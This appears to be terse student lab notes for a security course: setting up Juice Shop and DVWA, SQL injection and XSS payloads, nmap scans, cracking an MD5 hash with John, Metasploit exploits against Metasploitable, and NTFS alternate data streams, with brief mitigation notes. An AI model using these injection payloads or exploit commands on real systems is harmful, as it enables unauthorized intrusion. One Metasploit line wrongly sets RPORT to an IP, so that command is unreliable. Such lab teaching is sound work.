1/6. (juice shop)
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo docker run -d -p 3000:3000 bkimminich/juice-shop

http://localhost:3000

STEP 7 — Open Login
Top-right:
Account → Login
STEP 8 — Perform SQL Injection
Email:  ' OR 1=1--
Password: anything
Click: Log In
STEP 10 — Perform XSS
Use search bar.
Type: <script>alert(1)</script>


1/6. (dvwa)
sudo apt update
sudo apt install apache2 mariadb-server php php-mysqli git -y
sudo service apache2 start
sudo service mysql start
cd /var/www/html
sudo rm index.html
sudo git clone https://github.com/digininja/DVWA.git
sudo mv DVWA dvwa
sudo chmod -R 777 /var/www/html/dvwa
sudo mysql

INSIDE MySQL
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;

Open DVWA
In Kali browser:
http://localhost/dvwa
STEP 8 — Setup Page
Click:
Create / Reset Database
Login:
admin / password
STEP 9 — Set Security
Go to: DVWA Security
Set: Low
STEP 10 — Perform Attacks
SQL Injection
1' OR '1'='1
XSS
<script>alert(1)</script>

SQL Injection Mitigation

Use parameterized queries / prepared statements
Validate user input
Avoid dynamic SQL queries

XSS Mitigation

Sanitize user input
Escape HTML characters
Use Content Security Policy (CSP)


2. arp and nmap
ifconfig

arp -a

ping -c 4 8.8.8.8


# PART 2 — Nmap Scanning
# Replace <target_ip> with your Metasploitable IP

nmap <target_ip>

nmap -sV <target_ip>

nmap -A <target_ip>

Wireshark .pcap stuff http dns ...


3. john
echo -n "password" | md5sum
nano hash.txt
# Paste this inside nano
5f4dcc3b5aa765d61d8327deb882cf99
cat hash.txt
john --format=raw-md5 hash.txt
john --show --format=raw-md5 hash.txt

4. metasploitable
in mestasploitable   ifconfig  look target ip
in kali 
msfconsole
# Replace <target_ip> with Metasploitable IP
nmap -sV <target_ip> or nmap -p 21 -sV <target_ip>
use exploit/unix/ftp/vsftpd_234_backdoor or use exploit/multi/samba/usermap_script
set RHOST <target_ip>
set RPORT <target_ip>
run
whoami 


5. ads
echo This is a normal file > file.txt
echo Hidden data > file.txt:hidden.txt
type file.txt
more < file.txt:hidden.txt
dir /r